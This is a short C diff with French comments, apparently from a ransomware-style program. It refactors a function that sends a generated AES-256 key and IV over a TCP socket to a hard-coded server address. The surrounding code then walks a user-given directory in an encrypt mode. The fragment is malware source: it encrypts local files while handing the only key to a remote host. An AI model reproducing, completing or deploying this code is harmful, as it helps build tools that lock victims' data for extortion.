@@ -89,7 +89,7 @@ int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,
 	bytes_to_hexa(iv, pIv, sizeIv);
 }
 
-int send_key(char *pKey, char *pIv, char *serveraddress)
+int send_key(char *pKey, char *pIv)
 {
 	// Création de la socket
 	struct sockaddr_in server;
@@ -98,7 +98,7 @@ int send_key(char *pKey, char *pIv, char *serveraddress)
 	int sock = socket(AF_INET, SOCK_STREAM, 0);
 
 	// Convertit l'adresse IP en binaire
-	inet_pton(AF_INET, serveraddress, &server.sin_addr);
+	inet_pton(AF_INET, SERVER_ADDRESS, &server.sin_addr);
 
 	// Connexion
 	connect(sock, (struct sockaddr *)&server, sizeof(server));
@@ -138,7 +138,7 @@ int main(int argc, char *argv[])
 
 			generate_key(key, AES_256_KEY_SIZE, iv, AES_BLOCK_SIZE, pKey, pIv);
 
-			send_key(pKey, pIv, SERVER_ADDRESS);
+			send_key(pKey, pIv);
 
 			listdir(argv[2], iv, key, 'e');
 
